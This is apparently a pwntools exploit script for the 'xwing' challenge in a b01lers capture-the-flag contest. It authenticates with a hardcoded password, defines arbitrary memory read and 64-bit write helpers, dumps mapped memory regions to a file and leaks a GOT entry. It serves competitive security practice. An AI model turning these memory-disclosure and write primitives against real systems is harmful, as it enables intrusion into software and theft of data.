#!/usr/bin/env python3
from pwn import *
import logging
from binascii import hexlify, unhexlify
import time

# shellcodes['binsh32']
# shellcodes['binshx86_64']
# gethex(string)
ltrace = False

log = logging.getLogger("Exploit")

context.arch = "amd64"
context.terminal = ["alacritty", "-e", "sh", "-c"]

context.log_level = "info"

BINARY = "./xwing.dist"
HOST, PORT = "xwing.pwn.ctf.b01lers.com", 1337
LIBC_PATH = "/usr/lib/libc.so.6"

GDB_SETUP = """
set follow-fork-mode child
##c
"""
binary = ELF(BINARY)

flags = []

if "--live" not in sys.argv:
    if ltrace:
        p = heap_ltrace(BINARY, stdin=PTY)
    else:
        p = process(BINARY, stdin=PTY)
    if "--debug" in sys.argv:
        gdb.attach(p, GDB_SETUP)
else:
    p = remote(HOST, PORT)
    LIBC_PATH = "./xwing.libc"

if LIBC_PATH:
    libc = ELF(LIBC_PATH)


shipEngine = binary.symbols["shipEngine"]
damage = binary.symbols["damage"]
distance = binary.symbols["distance"]


def recvuntilprompt():
    global flags
    result = p.recvuntil("\n\033[36m>\033[0m ")
    if b"flag" in result:
        flags += [result]
        #print(result)
    return result

def examine(location: int, length: int):
    """
    Reads length from the target location
    """

    p.sendline("examine {} {}".format(hex(location), str(length)))
    resp = recvuntilprompt()
    #print(str(resp, 'utf8'))
    resp = resp.split(b"\n")[10:-3]
    buf = b""
    for line in resp:
        if b"0x" not in line:
            continue
        line = line.split(b':')[1][:3*16]
        buf += b"".join(line.split())

    buf = unhexlify(buf)
    return buf


def fix(location: int, value: int):
    """
    Writes 64 bits at the target address
    """
    p.sendline("fix {} {}".format(hex(location), hex(value)))


def throttle(speed: int):
    p.sendline("throttle {}".format(str(speed)))
    resp = recvuntilprompt()


def hyperdrive(on: bool):
    p.sendline("hyperdrive {}".format("on" if on else "off"))
    resp = recvuntilprompt()


p.recvuntil("Authorization Required:\x1b[0m ")
p.sendline("LeiaIsCute")
recvuntilprompt()

code = b''

mappings = [
    (0x400000, 0x401000, 0x1000, 0x0),
    (0x258a3000, 0x258a6000, 0x3000, 0x1000),
    (0x258a7000, 0x258a8000, 0x1000, 0x4000)
]
for mapping in mappings:
    base = mapping[0]
    length = mapping[2]
    print(hex(base))
    print(hex(length))
    code += examine(base, length)

print(code)
with open('dump', 'wb') as f:
    f.write(code)

printf = examine(binary.got["printf"], 32)

print(printf)
